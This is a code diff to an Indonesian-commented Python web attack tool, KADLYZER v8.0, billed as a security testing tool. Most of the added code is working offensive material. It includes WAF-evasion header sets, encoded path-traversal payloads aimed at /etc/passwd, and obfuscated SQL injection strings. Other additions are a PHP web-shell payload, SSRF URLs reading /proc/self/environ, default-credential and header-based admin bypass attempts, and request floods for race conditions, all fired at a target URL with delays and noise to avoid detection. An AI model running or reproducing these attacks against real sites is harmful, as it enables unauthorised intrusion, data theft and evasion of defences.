@@ -251,35 +251,59 @@ COMMON_PORTS = {
 # Tambahkan teknik bypass WAF yang lebih advanced
 ADVANCED_WAF_BYPASS = {
     "headers": [
+        # Headers untuk bypass WAF
         {
-            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
             "X-Originating-IP": "127.0.0.1",
-            "X-Forwarded-For": "127.0.0.1",
+            "X-Forwarded-For": "127.0.0.1, localhost, 192.168.1.1",
             "X-Remote-IP": "127.0.0.1",
-            "X-Remote-Addr": "127.0.0.1",
+            "X-Remote-Addr": "127.0.0.1", 
             "X-Client-IP": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "Client-IP": "127.0.0.1",
+            "X-Forwarded": "127.0.0.1",
+            "X-Forwarded-Host": "127.0.0.1",
             "X-Host": "127.0.0.1",
-            "X-Forwarded-Host": "127.0.0.1"
-        },
-        {
-            "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
-            "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "X-Custom-IP-Authorization": "127.0.0.1"
+            "True-Client-IP": "127.0.0.1",
+            "X-Custom-IP-Authorization": "127.0.0.1",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/96.0",
+            "Accept": "text/html,application/xhtml+xml,*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate",
+            "X-Requested-With": "XMLHttpRequest",
+            "Connection": "close"
         }
     ],
+    
+    # Tambahkan teknik bypass yang lebih advanced
     "techniques": [
-        "double_encode",
-        "unicode_bypass",
-        "case_switching",
-        "null_byte",
-        "path_bypass",
-        "hex_encode",
-        "comment_inject",
-        "whitespace_manipulation",
-        "charset_bypass",
-        "protocol_pollution"
+        {
+            "name": "path_traversal",
+            "payloads": [
+                "....//....//....//etc/passwd",
+                "%252e%252e%252fetc%252fpasswd",
+                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+                "..%c0%af..%c0%af..%c0%afetc/passwd",
+                "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+                "..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd",
+                "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
+            ]
+        },
+        {
+            "name": "sql_injection",
+            "payloads": [
+                "/*!50000%75%6e%69on*/ /*!50000%73%65%6c%65ct*/",
+                "%23%0A%0AAND%23%0A%0A9227=9227%23%0A%0A%23",
+                "+/*!50000UnIoN*/+/*!50000SeLeCt*/+",
+                "/*!12345UnIoN*//*!12345sElEcT*/",
+                "/*!13337UnIoN*//*!13337SeLeCt*/",
+                "/*!50000UnIoN*//*!50000SeLeCt*/",
+                "+UnIoN/*&a=*/SeLeCt/*&a=*/",
+                "+uni%0bon+se%0blect+",
+                "%55%6e%49%6f%4e(%53%65%4c%65%43%74 1,2,3,4)",
+                "+union+distinct+select+",
+                "+union+distinctROW+select+"
+            ]
+        }
     ]
 }
 
@@ -555,7 +579,7 @@ def banner():
     print(colored_banner)
     print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}")
     print(f"{Colors.GREEN}[+] KADLYZER v8.0 - Advanced Security Testing Tool{Colors.ENDC}")
-    print(f"{Colors.GREEN}[+] Created by: Your Name{Colors.ENDC}")
+    print(f"{Colors.GREEN}[+] Created by: KADEZ-406{Colors.ENDC}")
     print(f"{Colors.GREEN}[+] Enhanced Security Features & Beautiful UI{Colors.ENDC}")
     print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}\n")
 
@@ -1297,6 +1321,101 @@ class AdvancedBypassScanner:
             logger.error(f"Parameter discovery error: {str(e)}")
             return []
 
+    async def perform_advanced_bypass_scan(self):
+        """Advanced WAF bypass dengan multiple teknik"""
+        bypass_results = []
+        
+        try:
+            # Test semua kombinasi header bypass
+            for headers in ADVANCED_WAF_BYPASS["headers"]:
+                # Tambahkan random noise ke headers
+                headers = self.add_random_noise(headers)
+                
+                # Encode payload dengan berbagai metode
+                encoded_payloads = [
+                    urllib.parse.quote(payload),
+                    base64.b64encode(payload.encode()).decode(),
+                    "".join(f"%{ord(c):02x}" for c in payload),
+                    payload.replace(" ", "%20").replace("'", "%27").replace("\"", "%22")
+                ]
+                
+                for encoded in encoded_payloads:
+                    try:
+                        # Test dengan delay untuk menghindari rate limiting
+                        await asyncio.sleep(random.uniform(0.5, 1.5))
+                        
+                        # Kirim request dengan payload terenkripsi
+                        async with aiohttp.ClientSession() as session:
+                            async with session.get(
+                                self.target_info['full_url'], 
+                                headers=headers,
+                                params={"test": encoded},
+                                timeout=10
+                            ) as response:
+                                
+                                if response.status == 200:
+                                    content = await response.text()
+                                    
+                                    # Validasi response
+                                    if self.validate_bypass_success(content, payload):
+                                        bypass_results.append({
+                                            "payload": encoded,
+                                            "headers": headers,
+                                            "status": response.status
+                                        })
+                                    
+                    except Exception as e:
+                        logger.debug(f"Bypass attempt failed: {str(e)}")
+                        continue
+                    
+        except Exception as e:
+            logger.error(f"WAF bypass error: {str(e)}")
+        
+        return bypass_results
+
+    def validate_bypass_success(self, content, payload):
+        """Validasi jika bypass berhasil"""
+        # Check jika payload reflected di response
+        if payload.lower() in content.lower():
+            return True
+        
+        # Check untuk error messages yang menunjukkan bypass berhasil
+        error_patterns = [
+            "sql syntax",
+            "mysql error", 
+            "ora-",
+            "postgresql error",
+            "quoted string not properly terminated",
+            "unclosed quotation mark",
+            "unterminated string",
+            "/etc/passwd",
+            "root:x:0:0",
+            "[boot loader]",
+            "[operating systems]"
+        ]
+        
+        if any(pattern in content.lower() for pattern in error_patterns):
+            return True
+        
+        return False
+
+    def add_random_noise(self, headers):
+        """Tambahkan random noise ke headers untuk bypass WAF"""
+        noise_chars = string.ascii_letters + string.digits
+        
+        # Add random headers
+        headers.update({
+            f"X-Random-{i}": "".join(random.choices(noise_chars, k=10))
+            for i in range(random.randint(1,5))
+        })
+        
+        # Modify existing headers
+        for key in list(headers.keys()):
+            if random.random() < 0.3:  # 30% chance to modify
+                headers[key] = headers[key] + "".join(random.choices(noise_chars, k=5))
+            
+        return headers
+
 async def display_scan_status(message):
     """Display simple scan status"""
     print(f"{Colors.CYAN}[*] {message}{Colors.ENDC}")
@@ -1576,6 +1695,295 @@ async def run_kadlyzer(target_info):
         logger.error(error_msg)
         await display_result({'error': error_msg})
         return {'error': error_msg}
+
+# Tambahkan teknik advanced scanning yang lebih akurat
+class AdvancedScanner(AdvancedBypassScanner):
+    def __init__(self, target_info):
+        super().__init__(target_info)
+        self.advanced_techniques = {
+            "parameter_pollution": [
+                "id=1&id=2&id=1'",
+                "param=1;param=2;param=1'",
+                "test=1/**/AND/**/1=1",
+                "p=1%0Aid=1'%0Atest=1"
+            ],
+            "http_method_tampering": [
+                ("POST", {"id": "1' OR '1'='1"}),
+                ("PUT", {"data": "<?php system($_GET['cmd']); ?>"}),
+                ("PATCH", {"user": "admin'--"}),
+                ("OPTIONS", {"debug": "true"})
+            ],
+            "protocol_manipulation": [
+                "gopher://localhost:3306/_",
+                "file:///proc/self/environ",
+                "dict://localhost:11211/",
+                "ldap://localhost:389/dc=*"
+            ],
+            "advanced_headers": {
+                "X-Original-URL": "/admin/index.php",
+                "X-Rewrite-URL": "/config.php",
+                "X-Custom-IP-Authorization": "127.0.0.1",
+                "X-Forwarded-Scheme": "https",
+                "X-HTTP-Method-Override": "PUT",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Forwarded-Proto": "https"
+            }
+        }
+        
+    async def perform_advanced_scan(self):
+        """Melakukan scanning dengan teknik yang lebih advanced"""
+        results = {}
+        
+        try:
+            # 1. Parameter Discovery dengan Fuzzing
+            params = await self.fuzz_parameters()
+            if params:
+                results['discovered_params'] = params
+            
+            # 2. Test HTTP Method Tampering
+            method_vulns = await self.test_http_methods()
+            if method_vulns:
+                results['http_method_vulns'] = method_vulns
+            
+            # 3. Advanced Protocol Testing
+            protocol_vulns = await self.test_protocols()
+            if protocol_vulns:
+                results['protocol_vulns'] = protocol_vulns
+            
+            # 4. Advanced Header Manipulation
+            header_vulns = await self.test_headers()
+            if header_vulns:
+                results['header_vulns'] = header_vulns
+            
+            # 5. Advanced Authentication Bypass
+            auth_bypass = await self.test_auth_bypass()
+            if auth_bypass:
+                results['auth_bypass'] = auth_bypass
+            
+            # 6. Advanced Race Condition Testing
+            race_condition = await self.test_race_conditions()
+            if race_condition:
+                results['race_condition'] = race_condition
+                
+            return results
+            
+        except Exception as e:
+            logger.error(f"Advanced scan error: {str(e)}")
+            return {'error': str(e)}
+
+    async def fuzz_parameters(self):
+        """Fuzzing parameter untuk menemukan injection points"""
+        discovered = []
+        fuzz_patterns = [
+            "id=1'", 
+            "page=1;ls",
+            "file=/etc/passwd",
+            "debug=true",
+            "test=<script>alert(1)</script>",
+            "param=../../etc/passwd",
+            "search=1 UNION SELECT 1,2,3--",
+            "callback=alert(1);//"
+        ]
+        
+        async with aiohttp.ClientSession() as session:
+            for pattern in fuzz_patterns:
+                try:
+                    url = f"{self.target_info['full_url']}?{pattern}"
+                    async with session.get(url, headers=self.headers) as response:
+                        if response.status != 404:
+                            content = await response.text()
+                            if self.validate_fuzz_response(content, pattern):
+                                discovered.append({
+                                    'pattern': pattern,
+                                    'status': response.status,
+                                    'content_length': len(content)
+                                })
+                except Exception as e:
+                    logger.debug(f"Fuzz error: {str(e)}")
+                    
+        return discovered
+
+    async def test_http_methods(self):
+        """Test berbagai HTTP methods untuk vulnerabilities"""
+        vulns = []
+        test_data = {
+            "id": "1' OR '1'='1",
+            "file": "../../../etc/passwd",
+            "debug": "true",
+            "cmd": "cat /etc/passwd"
+        }
+        
+        async with aiohttp.ClientSession() as session:
+            for method, data in self.advanced_techniques['http_method_tampering']:
+                try:
+                    async with session.request(
+                        method, 
+                        self.target_info['full_url'],
+                        data=data,
+                        headers=self.headers
+                    ) as response:
+                        if response.status != 405:  # Method not allowed
+                            content = await response.text()
+                            if self.validate_method_response(content, method, data):
+                                vulns.append({
+                                    'method': method,
+                                    'data': data,
+                                    'status': response.status
+                                })
+                except Exception as e:
+                    logger.debug(f"HTTP method test error: {str(e)}")
+                    
+        return vulns
+
+    async def test_protocols(self):
+        """Test protocol-based attacks"""
+        vulns = []
+        
+        async with aiohttp.ClientSession() as session:
+            for protocol in self.advanced_techniques['protocol_manipulation']:
+                try:
+                    headers = self.headers.copy()
+                    headers['Referer'] = protocol
+                    
+                    async with session.get(
+                        self.target_info['full_url'],
+                        headers=headers,
+                        allow_redirects=True
+                    ) as response:
+                        content = await response.text()
+                        if self.validate_protocol_response(content, protocol):
+                            vulns.append({
+                                'protocol': protocol,
+                                'status': response.status,
+                                'response_length': len(content)
+                            })
+                except Exception as e:
+                    logger.debug(f"Protocol test error: {str(e)}")
+                    
+        return vulns
+
+    async def test_auth_bypass(self):
+        """Test advanced authentication bypass techniques"""
+        bypass_attempts = [
+            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
+            {"Cookie": "session=1234567890"},
+            {"X-Original-URL": "/admin"},
+            {"X-Rewrite-URL": "/admin"},
+            {"X-Custom-IP-Authorization": "127.0.0.1"},
+            {"X-Forwarded-For": "127.0.0.1"}
+        ]
+        
+        results = []
+        async with aiohttp.ClientSession() as session:
+            for headers in bypass_attempts:
+                try:
+                    merged_headers = {**self.headers, **headers}
+                    async with session.get(
+                        f"{self.target_info['full_url']}/admin",
+                        headers=merged_headers
+                    ) as response:
+                        if response.status == 200:
+                            content = await response.text()
+                            if "login" not in content.lower():
+                                results.append({
+                                    'headers': headers,
+                                    'status': response.status,
+                                    'length': len(content)
+                                })
+                except Exception as e:
+                    logger.debug(f"Auth bypass error: {str(e)}")
+                    
+        return results
+
+    async def test_race_conditions(self):
+        """Test for race condition vulnerabilities"""
+        results = []
+        test_endpoints = [
+            "/create_account",
+            "/transfer",
+            "/upload",
+            "/process"
+        ]
+        
+        async with aiohttp.ClientSession() as session:
+            for endpoint in test_endpoints:
+                tasks = []
+                for _ in range(10):  # Send 10 simultaneous requests
+                    task = asyncio.create_task(
+                        session.post(
+                            f"{self.target_info['full_url']}{endpoint}",
+                            headers=self.headers,
+                            data={"test": "data"}
+                        )
+                    )
+                    tasks.append(task)
+                
+                try:
+                    responses = await asyncio.gather(*tasks)
+                    status_codes = [r.status for r in responses]
+                    
+                    if len(set(status_codes)) > 1:  # Different responses indicate potential race condition
+                        results.append({
+                            'endpoint': endpoint,
+                            'status_codes': status_codes
+                        })
+                except Exception as e:
+                    logger.debug(f"Race condition test error: {str(e)}")
+                    
+        return results
+
+    def validate_fuzz_response(self, content, pattern):
+        """Validasi response dari parameter fuzzing"""
+        # Check for SQL injection
+        if "'" in pattern and any(err in content.lower() for err in [
+            'sql syntax',
+            'mysql error',
+            'ora-',
+            'postgresql error'
+        ]):
+            return True
+            
+        # Check for XSS
+        if "<script>" in pattern and pattern.lower() in content.lower():
+            return True
+            
+        # Check for LFI
+        if "/etc/passwd" in pattern and "root:" in content:
+            return True
+            
+        return False
+
+    def validate_method_response(self, content, method, data):
+        """Validasi response dari HTTP method testing"""
+        if method in ['PUT', 'POST', 'PATCH']:
+            if data.get('cmd') and any(cmd in content.lower() for cmd in [
+                'uid=',
+                'root:',
+                '/bin/bash'
+            ]):
+                return True
+                
+        if method == 'OPTIONS' and 'allow:' in content.lower():
+            return True
+            
+        return False
+
+    def validate_protocol_response(self, content, protocol):
+        """Validasi response dari protocol testing"""
+        if protocol.startswith('file:') and 'root:' in content:
+            return True
+            
+        if protocol.startswith('gopher:') and any(db in content.lower() for db in [
+            'mysql',
+            'postgresql',
+            'mongodb'
+        ]):
+            return True
+            
+        if protocol.startswith('dict:') and 'server' in content.lower():
+            return True
+            
+        return False
 
 if __name__ == "__main__":
     try:
